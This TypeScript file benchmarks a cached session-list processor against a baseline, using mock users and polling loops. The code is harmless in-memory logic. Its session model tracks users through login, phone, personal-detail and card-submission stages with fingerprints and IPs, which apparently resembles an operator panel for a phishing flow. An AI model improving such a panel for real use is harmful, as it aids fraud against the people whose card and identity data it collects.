
// Removed perf_hooks import

// --- Mocks & Interfaces ---

export interface UserFingerprint {
  userAgent: string;
  language: string;
  platform: string;
  screenResolution: string;
  ip: string;
}

export interface SessionHistory {
  id: string;
  timestamp: Date;
  lastSeen?: number;
  email: string;
  name: string;
  status: string;
  fingerprint: UserFingerprint;
  data: any;
  stage?: string;
  resendRequested?: boolean;
  isLoginVerified?: boolean;
  isPhoneVerified?: boolean;
  isPersonalVerified?: boolean;
  isCardSubmitted?: boolean;
  isFlowComplete?: boolean;
}

// Helper to generate random sessions
function generateSession(id: string, idx: number, lastSeenOffset = 0): any {
    return {
        sessionId: id,
        timestamp: new Date().toISOString(),
        lastSeen: Date.now() - lastSeenOffset,
        email: `user${idx}@example.com`,
        firstName: `First${idx}`,
        lastName: `Last${idx}`,
        status: 'Active',
        stage: 'login',
        fingerprint: {
            userAgent: 'Mozilla/5.0',
            language: 'en-US',
            platform: 'MacIntel',
            screenResolution: '1920x1080',
            ip: '127.0.0.1'
        },
        resendRequested: false,
        isLoginVerified: false,
        isPhoneVerified: false,
        isPersonalVerified: false,
        isCardSubmitted: false,
        isFlowComplete: false
    };
}

// --- Baseline Implementation ---

class BaselineService {
    activeSessions: SessionHistory[] = [];
    sessionId = () => 'admin_id';
    updates = 0;

    processSessionsData(sessions: any[]) {
        if (!Array.isArray(sessions)) return;

        const adminSessionId = this.sessionId();

        const rawActive = sessions.filter((s: any) => s.status !== 'Verified' && s.sessionId !== adminSessionId);
        const mappedActive: SessionHistory[] = rawActive.map(s => ({
            id: s.sessionId,
            timestamp: new Date(s.timestamp || Date.now()),
            lastSeen: s.lastSeen,
            email: s.email,
            name: `${s.firstName || ''} ${s.lastName || ''}`,
            status: s.status || 'Active',
            stage: s.stage,
            fingerprint: s.fingerprint,
            data: s,
            resendRequested: s.resendRequested,
            isLoginVerified: s.isLoginVerified,
            isPhoneVerified: s.isPhoneVerified,
            isPersonalVerified: s.isPersonalVerified,
            isCardSubmitted: s.isCardSubmitted,
            isFlowComplete: s.isFlowComplete
        }));

        mappedActive.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));

        // Emulating Signal behavior: always set
        this.activeSessions = mappedActive;
        this.updates++;
    }
}

// --- Optimized Implementation ---

class OptimizedService {
    activeSessions: SessionHistory[] = [];
    sessionId = () => 'admin_id';
    updates = 0;

    // Cache
    private sessionCache = new Map<string, SessionHistory>();

    private areObjectsEqual(obj1: any, obj2: any): boolean {
        if (obj1 === obj2) return true;
        if (typeof obj1 !== 'object' || obj1 === null || typeof obj2 !== 'object' || obj2 === null) {
          return false;
        }
        const keys1 = Object.keys(obj1);
        const keys2 = Object.keys(obj2);
        if (keys1.length !== keys2.length) return false;
        for (const key of keys1) {
          if (!keys2.includes(key) || !this.areObjectsEqual(obj1[key], obj2[key])) {
            return false;
          }
        }
        return true;
    }

    processSessionsData(sessions: any[]) {
        if (!Array.isArray(sessions)) return;

        const adminSessionId = this.sessionId();
        const rawActive = sessions.filter((s: any) => s.status !== 'Verified' && s.sessionId !== adminSessionId);

        let hasChanges = false;
        const newActiveSessions: SessionHistory[] = [];

        for (const s of rawActive) {
            const id = s.sessionId;
            const cached = this.sessionCache.get(id);

            // We compare 'data' which is the raw session object.
            // If the raw session object is identical content-wise to what we cached, we reuse the cached wrapper.
            // Note: cached.data IS the previous raw object.
            if (cached && this.areObjectsEqual(cached.data, s)) {
                newActiveSessions.push(cached);
            } else {
                // Create new
                const newSession: SessionHistory = {
                    id: s.sessionId,
                    timestamp: new Date(s.timestamp || Date.now()),
                    lastSeen: s.lastSeen,
                    email: s.email,
                    name: `${s.firstName || ''} ${s.lastName || ''}`,
                    status: s.status || 'Active',
                    stage: s.stage,
                    fingerprint: s.fingerprint,
                    data: s,
                    resendRequested: s.resendRequested,
                    isLoginVerified: s.isLoginVerified,
                    isPhoneVerified: s.isPhoneVerified,
                    isPersonalVerified: s.isPersonalVerified,
                    isCardSubmitted: s.isCardSubmitted,
                    isFlowComplete: s.isFlowComplete
                };
                this.sessionCache.set(id, newSession);
                newActiveSessions.push(newSession);
                hasChanges = true; // Item content changed or new item
            }
        }

        // Check for removals
        if (this.sessionCache.size > newActiveSessions.length) {
             const currentIds = new Set(newActiveSessions.map(s => s.id));
             for (const id of this.sessionCache.keys()) {
                 if (!currentIds.has(id)) {
                     this.sessionCache.delete(id);
                     hasChanges = true;
                 }
             }
        }

        newActiveSessions.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));

        // Check if array is effectively different
        // If hasChanges is true, we know content changed.
        // But what if only order changed? sort() handles that.
        // What if hasChanges is false (all items reused) but order changed?
        // We must compare with current activeSessions.

        const currentList = this.activeSessions;

        if (currentList.length !== newActiveSessions.length) {
            this.activeSessions = newActiveSessions;
            this.updates++;
            return;
        }

        let isDifferent = false;
        for (let i = 0; i < newActiveSessions.length; i++) {
            // Reference check is sufficient because we reuse objects!
            if (newActiveSessions[i] !== currentList[i]) {
                isDifferent = true;
                break;
            }
        }

        if (isDifferent) {
            this.activeSessions = newActiveSessions;
            this.updates++;
        }
    }
}

// --- Benchmark Runner ---

function runBenchmark() {
    console.log('Starting Benchmark...');

    const baseline = new BaselineService();
    const optimized = new OptimizedService();

    const sessionIds = Array.from({length: 20}, (_, i) => `session_${i}`);

    // 1. Initial Load
    console.log('\n--- Step 1: Initial Load ---');
    const data1 = sessionIds.map((id, i) => generateSession(id, i));
    // Simulate JSON parse (creates new objects)
    const payload1 = JSON.parse(JSON.stringify(data1));

    baseline.processSessionsData(payload1);
    optimized.processSessionsData(payload1);

    console.log(`Baseline Updates: ${baseline.updates}`);
    console.log(`Optimized Updates: ${optimized.updates}`);
    console.log(`Baseline Objects: ${baseline.activeSessions.length}`);
    console.log(`Optimized Objects: ${optimized.activeSessions.length}`);

    // 2. Poll with Identical Data (Simulating new JSON objects from server)
    console.log('\n--- Step 2: Poll with Identical Data ---');
    // We create NEW objects but with SAME content
    const payload2 = JSON.parse(JSON.stringify(data1));

    const startB = Date.now();
    for(let i=0; i<1000; i++) {
        // We must clone payload every time to simulate fresh JSON response
        const p = JSON.parse(JSON.stringify(data1));
        baseline.processSessionsData(p);
    }
    const endB = Date.now();

    const startO = Date.now();
    for(let i=0; i<1000; i++) {
        const p = JSON.parse(JSON.stringify(data1));
        optimized.processSessionsData(p);
    }
    const endO = Date.now();

    console.log(`Baseline Time (1000 iter): ${(endB - startB).toFixed(2)}ms`);
    console.log(`Optimized Time (1000 iter): ${(endO - startO).toFixed(2)}ms`);
    console.log(`Baseline Total Updates: ${baseline.updates}`);
    console.log(`Optimized Total Updates: ${optimized.updates} (Should be 1)`);

    // Verify Object Stability
    const oldRef = optimized.activeSessions[0];
    const payload3 = JSON.parse(JSON.stringify(data1));
    optimized.processSessionsData(payload3);
    const newRef = optimized.activeSessions[0];
    console.log(`Object Reference Preserved: ${oldRef === newRef}`); // Should be true

    // 3. Poll with Changes
    console.log('\n--- Step 3: Poll with One Change ---');
    const dataChanged = JSON.parse(JSON.stringify(data1));
    dataChanged[0].status = 'Verified'; // This removes it from active list

    optimized.processSessionsData(dataChanged);
    console.log(`Optimized Updates: ${optimized.updates} (Should be 2)`);
    console.log(`Optimized Length: ${optimized.activeSessions.length} (Should be 19)`);
}

runBenchmark();
